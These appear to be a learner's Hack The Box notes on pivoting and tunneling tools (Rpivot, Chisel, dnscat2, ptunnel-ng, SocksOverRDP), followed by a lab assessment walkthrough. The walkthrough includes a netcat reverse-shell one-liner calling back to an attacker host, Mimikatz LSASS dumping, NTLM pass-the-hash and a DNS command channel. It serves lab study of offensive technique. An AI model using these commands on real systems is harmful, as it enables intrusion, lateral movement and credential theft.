 **Rpivot = Pivot connects BACK to my Attack Machine → SOCKS → I reach the internal network.** I don't need Rpivot if **SSH + sshuttle** or **Meterpreter SOCKS** already works easily. I am gaining no shell through this but **network access to internal machines through Ubuntu**. 
 Rpivot has two parts:

```text
Attack Machine → server.py
Ubuntu Pivot   → client.py
```

---

### 1. Get Rpivot — Attack Machine

```bash
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
```

---

### 2. Start Rpivot Server — Attack Machine

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

```text
9050 = SOCKS proxy on my Attack Machine
9999 = port where Ubuntu connects BACK
```

---

### 3. Transfer Rpivot — Attack Machine → Ubuntu

```bash
scp -r rpivot ubuntu@<Pivot-IP>:/home/ubuntu/
```

---

### 4. Start Rpivot Client — Ubuntu Pivot

```bash
cd ~/rpivot
python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

Now Ubuntu connects **BACK** to my Attack Machine:

```text
Ubuntu Pivot → 10.10.14.18:9999
```

---

### 5. Configure ProxyChains — Attack Machine

Add:

```text
sudo nano /etc/proxychains.conf
socks4 127.0.0.1 9050
```

`9050` is the SOCKS proxy created by `server.py`.

---

### 6. Access the Internal Network — Attack Machine

Example: internal web server (From the Ubuntu pivot, find the internal host by `for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done`. 


```text
172.16.5.135:80
```

Use:

```bash
proxychains firefox-esr 172.16.5.135:80

proxychains curl -s http://172.16.5.135/ | less

proxychains nmap 172.16.5.135 -p80 -sT -Pn
```

Traffic:

```text
Firefox / Nmap
      ↓
ProxyChains
      ↓
127.0.0.1:9050
      ↓
Rpivot
      ↓
Ubuntu Pivot
      ↓
172.16.5.135:80
```

More:

| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication. |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------- |


---
---


# Section 11 - Port Forwarding with Windows Netsh

You use it when you have a **Windows pivot** and don't want/need to install another tunneling tool.

### When to use

Use `netsh portproxy` when:

- I have access to a **Windows pivot**.
- The Windows pivot can reach an **internal target**.
- I only need to forward **ONE specific port** (e.g. RDP, SMB, FTP).

### Example

```text
Attack Machine
     ↓ :8080
Windows Pivot (10.129.15.150)
     ↓ :3389
Internal Target (172.16.5.25)
```

### 1. Create the port forward

Run on the **Windows pivot**:

```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

Meaning:

```text
10.129.15.150:8080 → 172.16.5.25:3389
```

- `listenaddress=10.129.15.150` → The IP address on the **Windows Pivot** where it listens.
- `listenport=8080` → The port the **Attack Machine connects to**.
- `connectaddress=172.16.5.25` → The **internal target** we want to reach.
- `connectport=3389` → The target's **RDP port**.

Anything coming to my Windows Pivot on port 8080, send it to the internal target's RDP port 3389.
### 2. Verify

```cmd
netsh.exe interface portproxy show v4tov4
```

### 3. Connect from Attack Machine

For example, RDP:

```bash
xfreerdp /v:10.129.15.150:8080 /u:victor /p:'pass@123'
```

The connection goes:

```text
Attack → Windows Pivot:8080 → Internal Target:3389
```



---
---

# Section 12 -  DNS Tunneling with Dnscat2

Use **Dnscat2** when normal connections (HTTP/HTTPS, SSH, etc.) are blocked, but **DNS traffic is still allowed**. It creates a tunnel through **DNS queries**, allowing data/commands to travel between the target and my attack machine.

Dnscat2 is used to **access/control a compromised Windows target through DNS**, rather than to pivot through it to another machine. I can potentially use that Windows machine for further pivoting afterward. Dnscat2 is useful **after I already have code execution but normal communication back to my Attack Machine is restricted**. I was wondering why i would need a connection back, well You need a connection back because a shell on the target is useful, but without a communication channel, you can't conveniently control it remotely.. So, it demonstrates a **restricted-network communication technique**, not initial exploitation.


### How it works

Dnscat2 hides tunnel data inside DNS traffic, including **TXT records**.

The target sends DNS requests → the DNS traffic reaches my dnscat2 server → data is carried through the DNS channel. The communication is **encrypted** using a pre-shared secret.

---

## 1. Set up dnscat2 Server

On the **Attack Machine**:

```
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Start the server:

```
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

The server gives a **secret key**, for example:

```
0ec04a91cd1e963f8c03ca499d589d21
```

I need this secret on the Windows target so the client can authenticate and encrypt the connection.

---

## 2. Get the PowerShell Client

On the **Attack Machine**:

```
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Transfer `dnscat2.ps1` to the Windows target. For example, host it from the Attack Machine:

```
python3 -m http.server 8000
```

Then download it from the Windows target:

```
Invoke-WebRequest http://10.10.14.18:8000/dnscat2.ps1 -OutFile C:\htb\dnscat2.ps1
```

Alternatively, use:

```
curl.exe http://10.10.14.18:8000/dnscat2.ps1 -o C:\htb\dnscat2.ps1
```

Replace `10.10.14.18` with the IP address of the Attack Machine.

---

## 3. Run Client on Windows

Import the module:

```
Import-Module .\dnscat2.ps1
```

Connect to my dnscat2 server:

```
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

### What this means

- `-DNSserver` → My dnscat2 server.
- `-Domain` → Domain used for the DNS tunnel.
- `-PreSharedSecret` → Secret generated by the server.
- `-Exec cmd` → Gives me a Windows CMD session through the tunnel.

---

## 4. Confirm the Connection

On the Attack Machine:

```
dnscat2> 
```

If successful:

```
Session 1 Security: ENCRYPTED AND VERIFIED!
```

This means the Windows client successfully connected and the communication is encrypted.

---

## 5. Interact with the Shell

List available commands:

```
dnscat2> ?
```

Interact with session `1`:

```
dnscat2> window -i 1
```

Now I get a Windows CMD shell:

```
Microsoft Windows [Version 10.0.18363.1801]

C:\Windows\system32>
```

To return to the dnscat2 prompt:

```
Ctrl + Z
```

---
---


# Section 13 - SOCKS5 Tunneling with Chisel


Use **Chisel** when I have compromised a **pivot machine** and want to reach **internal machines/networks through it**. **No SSH is required.** Chisel creates the tunnel itself.

> **Chisel = sshuttle-like pivoting, but without needing SSH.**

**Chisel must run on both ends:** one machine runs the **server**, the other runs the **client**.

---

## Normal Chisel Pivot

Use this when the **Attack Machine can connect to the Pivot**.

```text
Attack Machine
      ↓
   Pivot
      ↓
Internal Network
```

### 1. Get Chisel

On the **Attack Machine**, download latest chisel:

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```

Transfer the binary to the Pivot:

```bash
scp chisel ubuntu@10.129.202.64:~/
```

Now Chisel exists on **both machines**.

---

### 2. Start Chisel Server on Pivot

Make binary executable

`chmod +x chisel`

```bash
./chisel server -v -p 1234 --socks5
```

The Pivot listens on port `1234` for the Chisel connection.

```text
Pivot:1234
```

`--socks5` tells Chisel to provide a SOCKS5 proxy for reaching networks accessible from the Pivot. 
If version mismatches download latest chisel or With `CGO_ENABLED=0 go build -o chisel` in attack machine's chisel directory, Go builds Chisel without the normal system C library dependency, making the binary much more portable across Linux systems.

---

### 3. Connect from Attack Machine

On the **Attack Machine**:

```bash
./chisel client -v 10.129.202.64:1234 socks
```

The client connects to the Pivot's Chisel server.

It creates a local SOCKS5 proxy:

```text
127.0.0.1:1080
```

So the path becomes:

```text
Attack Machine
      ↓
127.0.0.1:1080
      ↓
Chisel Tunnel
      ↓
Ubuntu Pivot
      ↓
Internal Network
```

---

### 4. Configure ProxyChains

Edit:

```bash
sudo nano /etc/proxychains.conf
```

At the end, add:

```text
[ProxyList]
socks5 127.0.0.1 1080
```

Now applications launched with `proxychains` can use the Chisel tunnel.

---

### 5. Access the Internal Target

For example, RDP to the internal DC:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

I don't connect directly from my Attack Machine to the DC.

The traffic goes:

```text
Attack Machine
      ↓
127.0.0.1:1080
      ↓
Chisel
      ↓
Ubuntu Pivot
      ↓
172.16.5.19:3389
```

---

## Reverse Chisel Pivot


Use **Reverse Chisel** when the **Pivot cannot accept an incoming connection from the Attack Machine**, but the Pivot **can connect OUT to the Attack Machine**.

```text
Normal:
Attack → Pivot

Reverse:
Pivot → Attack
```

### 1. Start Chisel Server on Attack Machine

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

The Attack Machine now waits for the Pivot to connect back.

---

### 2. Connect from the Pivot

On the **Ubuntu Pivot**:

```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

The Pivot initiates the connection **back to the Attack Machine**. The reverse SOCKS tunnel gives the Attack Machine access to the networks reachable through the Pivot.

```text
Ubuntu Pivot
      ↓
   connects OUT
      ↓
Attack Machine
      ↓
   SOCKS5
      ↓
Internal Network
```

---

### 3. Configure ProxyChains

On the Attack Machine:

```bash
sudo nano /etc/proxychains.conf
```

Add:

```text
socks5 127.0.0.1 1080
```

---

### 4. Access the Internal Target

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

The traffic is carried through the reverse Chisel tunnel to the Pivot, which can reach the internal target.

---

## Normal vs Reverse — Simple Difference

```text
NORMAL CHISEL

Attack Machine
      ↓
   Pivot
      ↓
Internal Target
```

The **Attack Machine connects to the Pivot**.

```text
REVERSE CHISEL

Attack Machine
      ↑
      │
   Pivot
      ↓
Internal Target
```

The **Pivot connects back to the Attack Machine**. Use reverse when the network/firewall prevents the Attack Machine from connecting **into** the Pivot. Check attack to pivot connection with `nc -nv 10.129.202.64 port_service` to determine whether normal or reverse is needed. 


---
---


# Section 14 - ICMP Tunneling with SOCKS

**The previous tunneling methods we discussed were mainly TCP-based.**

- **SSH** `-L/-R/-D` → TCP/SSH
- **Chisel** → TCP-based connection (HTTP/WebSocket transport)
- **Meterpreter port forwarding/SOCKS** → TCP
- **sshuttle** → uses SSH/TCP
- **Socat** → commonly TCP
- **ptunnel-ng** → **ICMP**, so it's useful when TCP communication is restricted.
- **How do I know?** Test the specific service/port (e.g. `nc -nv IP 3389`) and test ICMP (`ping IP`). Choose the tunnel based on what works.

So, in this HTB scenario, I can **SSH to Ubuntu**, but TCP connections to the **internal network/services I need to reach are restricted**, while **ICMP is allowed**. Therefore, I use **ICMP tunneling**. `ptunnel-ng` carries my tunneled traffic inside **ICMP Echo Request/Reply packets**, allowing me to communicate through the pivot even when the required TCP communication is restricted.

```text
My Attack Machine
       ↓
     SSH
       ↓
 ptunnel-ng
       ↓
  ICMP packets
       ↓
 Ubuntu Pivot
       ↓
 Internal Network
```

---

### Step 1 — Build `ptunnel-ng`

On my **Attack Machine**:

```
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/
sudo ./autogen.sh
```

The executable is created under:

```
src/ptunnel-ng
```

So I run it using:

```
sudo ./src/ptunnel-ng
```


---

### Step 2 — Start `ptunnel-ng` on the Pivot

 On Attack machine: 
 
```
scp src/ptunnel-ng ubuntu@10.129.189.61:~/ptunnel-ng-bin
```

Then on the pivot:

```
chmod +x ~/ptunnel-ng-bin
sudo ~/ptunnel-ng-bin -r10.129.189.61 -R22
```

Here:

```
-r10.129.189.61 → address used by ptunnel-ng
-R22            → forward the tunneled connection to SSH port 22
```

Leave this running. The pivot is now acting as the **ptunnel-ng server**.

---

### Step  3 — Start the `ptunnel-ng` Client

On my **Attack Machine**:

```
sudo ./src/ptunnel-ng -p10.129.189.61 -l2222 -r10.129.189.61 -R22
```

Here:

```
-p10.129.189.61 → ptunnel-ng server / Pivot
-l2222          → local port on my Attack Machine
-r10.129.189.61 → remote address
-R22            → remote SSH port
```

The important idea is:

```
Attack Machine:2222
        ↓
    ptunnel-ng
        ↓
      ICMP
        ↓
WEB01:22
```

So port `2222` on my Attack Machine becomes my local entry point into the ICMP tunnel.

---

### Step 4 — Test the ICMP Tunnel with SSH

Now I can connect through the local port:

```
ssh -p2222 -lubuntu 127.0.0.1
```

This looks strange because I am connecting to:

```
127.0.0.1:2222
```

But `2222` is actually the **local ptunnel-ng port**.

The traffic path is:

```
SSH
 ↓
127.0.0.1:2222
 ↓
ptunnel-ng client
 ↓
ICMP
 ↓
ptunnel-ng server on WEB01
 ↓
WEB01:22
```

So I am effectively SSHing to the pivot **through ICMP**.

---

### Step 5 — Create a SOCKS Proxy Through the ICMP Tunnel

Now I can combine the ICMP tunnel with **SSH dynamic forwarding**. Instead of creating a normal SSH session:

```
ssh -p2222 -lubuntu 127.0.0.1
```

I create a SOCKS proxy:

```
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

This creates:

```
SOCKS5
127.0.0.1:9050
```

The complete path becomes:

```
Application
    ↓
SOCKS5 :9050
    ↓
SSH
    ↓
ptunnel-ng
    ↓
ICMP
    ↓
WEB01
    ↓
Internal Network
```

This is very useful because now **multiple applications** can use the ICMP tunnel.

---

#### Why Do I Use SOCKS Here?

`ptunnel-ng` gives me the **ICMP transport**.

SSH `-D` gives me a **SOCKS proxy**.

They solve different problems:

```
ptunnel-ng
→ carries traffic through ICMP (transport/channel)

SSH -D
→ allows applications to use that tunnel through SOCKS (proxy for applications)
```


---

### Step 6 — Configure ProxyChains

On my Attack Machine:

```
sudo nano /etc/proxychains.conf
```

Add:

```
[ProxyList]
socks5 127.0.0.1 9050
```

Now applications launched with ProxyChains can use the SOCKS proxy. For example:

```
proxychains nc -nv 172.16.5.19 3389
```

---

### Step 7 — RDP to the DC


```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore
```

If FreeRDP tries to use Kerberos and produces errors. I can force a different RDP security mode, for example:

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore /sec:rdp
```


---
---


# Section 15 - RDP and SOCKS Tunneling with SocksOverRDP


I use **SocksOverRDP** when I already have **RDP access to a Windows machine** and want to reach an internal network through that RDP connection. Unlike the previous methods, SocksOverRDP does not use SSH, Meterpreter, Chisel, or ICMP. It uses the existing **RDP session** as the transport by carrying SOCKS traffic through an **RDP Dynamic Virtual Channel (DVC)**.

- **SSH tunneling:** Requires SSH access and carries traffic through SSH.
- **Chisel:** Creates a separate tunnel over TCP, HTTP, or WebSocket.
- **Meterpreter port forwarding/SOCKS:** Requires an active Meterpreter session.
- **sshuttle:** Uses SSH to provide subnet-level routing.
- **ptunnel-ng:** Carries traffic through ICMP when TCP is restricted.
- **SocksOverRDP:** Requires RDP access and carries SOCKS traffic through the existing RDP connection.

Instead of creating a completely new tunnel, I **reuse my existing RDP connection as the tunnel**. RDP supports **Dynamic Virtual Channels (DVCs)**, which allow additional data to travel inside an RDP session. SocksOverRDP uses a DVC to transport SOCKS traffic.
### Basic Idea

Normally:

```text
My Attack Machine
        ↓ RDP
Windows Pivot
        ↓
Internal Network
```

SocksOverRDP allows me to carry **SOCKS traffic inside the existing RDP connection**.

```text
Application
    ↓
SOCKS
    ↓
SocksOverRDP
    ↓
RDP Dynamic Virtual Channel
    ↓
Windows Pivot
    ↓
Internal Network
```


---

### HTB Setup

Example:

```text
My Attack Machine
        |
        | RDP
        ↓
Windows Pivot
        |
        ↓
Internal Network
        |
        ↓
Internal DC
```

I already have RDP access to the **Windows Pivot**.

---

## Step 1 — Download the Required Tools

### On: ATTACK MACHINE

I download:

```
SocksOverRDP-Plugin.dll
SocksOverRDP-Server.exe
Proxifier
```

I now have the required files on my Attack Machine.

```
Attack Machine
├── SocksOverRDP-Plugin.dll
├── SocksOverRDP-Server.exe
└── Proxifier
```

---

## Step 2 — Start a File Server On ATTACK MACHINE

If I need to transfer the files to Windows, I can use Python's HTTP server:

```
python3 -m http.server 8000
```

Now my Attack Machine is serving the files on:

```
http://<ATTACK-IP>:8000/
```

---

## Step 3 — Transfer the SocksOverRDP Plugin

From: ATTACK MACHINE To: WINDOWS PIVOT

On the **Windows Pivot**, download:


```
Invoke-WebRequest http://<ATTACK-IP>:8000/SocksOverRDP-Plugin.dll -OutFile SocksOverRDP-Plugin.dll
```


---

## Step 4 — Register the Plugin On WINDOWS PIVOT

Register the DLL:

```
regsvr32.exe SocksOverRDP-Plugin.dll
```

This registers the SocksOverRDP plugin so it can communicate through the RDP Dynamic Virtual Channel.

---

## Step 5 — Connect to the Windows Pivot Using RDP On ATTACK MACHINE

Start RDP:

```
mstsc.exe
```

Connect to the **Windows Pivot**.

Now:

```
Attack Machine
      ↓ RDP
Windows Pivot
```

The important thing is that I already have an **RDP connection**. SocksOverRDP will use this connection to carry the SOCKS traffic.

---

## Step 6 — Transfer SocksOverRDP Server

 From: ATTACK MACHINE To: WINDOWS PIVOT

Transfer:

```
SocksOverRDP-Server.exe
```

For example, if the HTTP server is still running:

On: WINDOWS PIVOT

```
Invoke-WebRequest http://<ATTACK-IP>:8000/SocksOverRDP-Server.exe -OutFile SocksOverRDP-Server.exe
```

Now the Windows Pivot has:

```
SocksOverRDP-Plugin.dll
SocksOverRDP-Server.exe
```

---

## Step 7 — Run the SocksOverRDP Server On WINDOWS PIVOT

Run:

```
SocksOverRDP-Server.exe
```

Run it with the required privileges for the HTB setup. The server communicates with the plugin through the **RDP Dynamic Virtual Channel**.

---

## Step 8 — Check the SOCKS Listener On WINDOWS PIVOT

Check whether the SOCKS endpoint is listening:

```
netstat -antb | findstr 1080
```

Expected:

```
TCP    127.0.0.1:1080    0.0.0.0:0    LISTENING
```

So now I have:

```
127.0.0.1:1080
```

This is my **local SOCKS endpoint**.

---

## Step 9 — Install Proxifier On WINDOWS PIVOT

I also need **Proxifier** on the Windows machine where I want to run applications through the SOCKS proxy. Transfer the Proxifier files from the Attack Machine using the same method:

```
Invoke-WebRequest http://<ATTACK-IP>:8000/ProxifierPE.zip -OutFile ProxifierPE.zip
```

Extract it.

---

## Step 10 — Configure Proxifier On WINDOWS PIVOT

Open Proxifier. Configure the SOCKS proxy as:

```
Address: 127.0.0.1
Port:    1080
```

So:

```
Windows Application
        ↓
Proxifier
        ↓
127.0.0.1:1080
```

**Proxifier does NOT create the tunnel.** It only takes application traffic and sends it to the SOCKS endpoint.

---

## Step 11 — Complete Tunnel

Now the complete path is:

```
Windows Application
        ↓
Proxifier
        ↓
127.0.0.1:1080
        ↓
SocksOverRDP
        ↓
RDP Dynamic Virtual Channel
        ↓
Existing RDP connection
        ↓
Windows Pivot
        ↓
Internal Network
        ↓
Internal Target
```


---

## Step 12 — Access the Internal Target On WINDOWS PIVOT

Now I can run an application through Proxifier. If I want to RDP to an internal machine:

```
mstsc.exe
```

I enter the internal target's IP. So the Windows Pivot becomes my path into the internal network.

---
---




# Final Skill Assessment 

## 1. Initial Web Shell & Enumeration

I started with a **web shell** on the compromised Linux server and enumerated the filesystem and available information. While checking the `webadmin` directory, I found an **`id_rsa`**** private SSH key**. I also found a note:

```text
in order to reach server01 or other servers in the subnet from here you have to use the

account: mlefay
password: Plain Human work!
```

This was an important clue because it gave me credentials for reaching other machines in the internal network.

---

# 2. Identify the Two Networks

I checked the routing table:

```bash
ip route
```

I found that the machine was connected to two networks:

```text
10.129.0.0/16
172.16.0.0/16
```

The interfaces confirmed this:

```bash
ip addr
```

I found:

```text
ens160 → 10.129.189.246/16 10.129.255.255
ens192 → 172.16.5.15/16 172.16.255.255
```

So:

```text
ens160 → 10.129.0.0/16
ens192 → 172.16.0.0/16
```

The important discovery was that the compromised server had access to the **internal ****`172.16.0.0/16`**** network**, which my Attack Machine could not directly access.

---

# 3. Get a Better Shell

The web shell was inconvenient, so I first checked which tools were available:

```bash
which nc
which bash
which python3
which socat
```

I also tested whether the target could connect back to my Attack Machine:

```bash
nc -nv <ATTACK_IP> <PORT>
```

If outbound connectivity works, I can start a listener on my Attack Machine:

```bash
nc -nlvp 4444
```

Then use a matching reverse-shell command. The general process is:

```text
Check available tools
        ↓
Test outbound connectivity
        ↓
Choose matching reverse shell
        ↓
Get reverse shell
        ↓
Upgrade the shell
```

The reverse shell I used was:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f
```

Then I upgraded it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# 4. Enumerate the Internal Network

Because the compromised machine had a route to:

```text
172.16.0.0/16
```

I performed an ICMP sweep:

```bash
for i in {0..255}; do for j in {1..254}; do (ping -c 1 -W 1 172.16.$i.$j 2>/dev/null | grep "bytes from" &); done; done; wait
```

I found:

```text
172.16.5.15
172.16.5.35
```

`172.16.5.15` was the compromised machine itself.

I checked SSH connectivity:

```bash
nc -nv 172.16.5.35 22
```

The host had SSH available. However, directly trying SSH from the web shell was unreliable, so I looked for another way to reach the internal network.

---

# 5. Use the `id_rsa` Key to Create a SOCKS Tunnel

I used the private key I found in the `webadmin` directory. First, I fixed its permissions:

```bash
chmod 600 id_rsa
```

SSH does not accept a private key when its permissions are too open by changing permission with +x. I then created a SOCKS proxy from my Attack Machine:

```bash
ssh -D 9050 webadmin@10.129.189.246 -i id_rsa
```

This created:

```text
127.0.0.1:9050
```

on my Attack Machine.

---

# 6. Configure ProxyChains

On my Attack Machine:

```bash
sudo nano /etc/proxychains4.conf
```

I configured the SOCKS proxy:

```text
[ProxyList]
socks4 127.0.0.1 9050
```

Now I could run applications through the SSH tunnel using:

```bash
proxychains <command>
```

---

# 7. RDP to `172.16.5.35`

Using the credentials from the note:

```text
Username: mlefay
Password: Plain Human work!
```

I successfully reached the Windows machine through the SOCKS tunnel. I tried the other ip also, but couldnt get in. The RDP command that worked was:

```bash
proxychains xfreerdp /v:172.16.5.35 /u:'.\mlefay' /p:'Plain Human work!' /cert:ignore
```

The `.\mlefay` format worked because `.\` tells Windows to authenticate `mlefay` as a local account on the target machine, rather than as a domain account. I now had a Windows shell/RDP session on:

```text
172.16.5.35
```

and obtained the flag there.

---

# 8. Transfer Mimikatz to the Windows Machine

I needed Mimikatz to investigate credentials in LSASS. Because the target was x64, I used the x64 version. On my Attack Machine, inside the Mimikatz `x64` directory, I started an HTTP server:

```bash
python3 -m http.server 8080
```

The target could not directly reach my Attack Machine, so downloading with:

```cmd
curl.exe http://10.10.15.86:8080/mimikatz.exe -o C:\mimikatz.exe
```

timed out.

I also tried SSH/SCP/SFTP, but the SSH connection allowed shell access while the file-transfer subsystem closed the connection. Since I already had RDP, I used **RDP drive redirection** instead.

```bash
proxychains xfreerdp /v:172.16.5.35 /u:'.\mlefay' /p:'Plain Human work!' /cert:ignore /drive:mimikatz,/home/htb-ac-1094410/mimikatz/x64
```

Inside Windows, I accessed the redirected drive:

```cmd
dir \\tsclient\mimikatz
```

Then copied Mimikatz:

```cmd
copy \\tsclient\mimikatz\mimikatz.exe C:\mimikatz.exe
```

---

# 9. Run Mimikatz as Administrator

I ran Mimikatz with administrative privileges. I used:

```text
privilege::debug
```

Then investigated credentials from LSASS. I eventually obtained:

```text
vfrank
    Domain : INLANEFREIGHT
    NTLM   : 2e16a00be74fa0bf862b4256d0347e83
    SHA1   : b055c7614a5520ea0fc1184ac02c88096e447e0b
```

The important value for Pass-the-Hash was:

```text
2e16a00be74fa0bf862b4256d0347e83
```

---

# 10. Enumerate the Next Network

From the Windows machine, I performed another network enumeration using:

```cmd
ipconfig
route print
```

I also checked the `172.16.5.0/24` network, but it did not reveal anything useful. I then scanned the next network:

```cmd
for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.6.%i | find "Reply"
```

I found that the next network was:

```text
172.16.6.0/24
```

I found two new hosts:

```text
172.16.6.25
172.16.6.45
```

The next target was:

```text
172.16.6.25
```

---

# 11. RDP to `172.16.6.25` Using Pass-the-Hash

I already had:

```text
Username: vfrank
Domain: INLANEFREIGHT
NTLM: 2e16a00be74fa0bf862b4256d0347e83
```

Normal `mstsc.exe` cannot directly accept an NTLM hash. Since I was already on the Windows pivot `172.16.6.35`, I used Mimikatz to create a process with the stolen NTLM credentials and launch RDP:

```text
privilege::debug
```

Then:

```text
sekurlsa::pth /user:vfrank /domain:INLANEFREIGHT /ntlm:2e16a00be74fa0bf862b4256d0347e83 /run:"mstsc.exe /restrictedadmin"
```

This opened RDP using the injected credentials. I then connected to:

```text
172.16.6.25
```

The flow was:

```text
Attack Machine
      ↓ RDP
172.16.6.35
      ↓ PTH + RDP
172.16.6.25
```

I obtained another flag.

---

# 12. Find the Next Share

On `172.16.6.25`, I discovered another mapped network drive:

```text
AutomateDCAdmin (Z:)
```

I checked where it pointed:

```cmd
net use
```

It pointed to:

```text
\\172.16.10.5\AutomateDCAdmin
```

I then checked the host:

```cmd
net view \\172.16.10.5
```

I could see standard domain-controller shares:

```text
NETLOGON
SYSVOL
```

This indicated that:

```text
172.16.10.5
```

was likely a **Domain Controller**. However, the share required credentials that I did not yet have in plaintext.

---

# 13. Final Lesson — LSASS Minidump

At this point, I was stuck because I had credentials/hashes but needed the **cleartext credentials for the service account** used by the share.

The important lesson was:

> If I need credentials from LSASS and have sufficient privileges, I can create an LSASS minidump and analyze it offline.

On Windows:

```text
Task Manager
    ↓
Details
    ↓
lsass.exe
    ↓
Right-click
    ↓
Create dump file
```

Windows created an LSASS dump file:

```text
lsass.DMP
```

Then transfer the dump back to Attack Machine for offline analysis. On my Attack Machine:

```bash
pypykatz lsa minidump lsass.DMP
```

`pypykatz` can extract credential material from the LSASS dump, including potentially **cleartext credentials** for accounts that were present in LSASS. I obtained the required password and used it to access the:

```text
\\172.16.10.5\AutomateDCAdmin
```

share and obtained the final flag.

**To note:** LSASS dump = credentials currently present on THAT machine, not credentials from machines you previously compromised.

---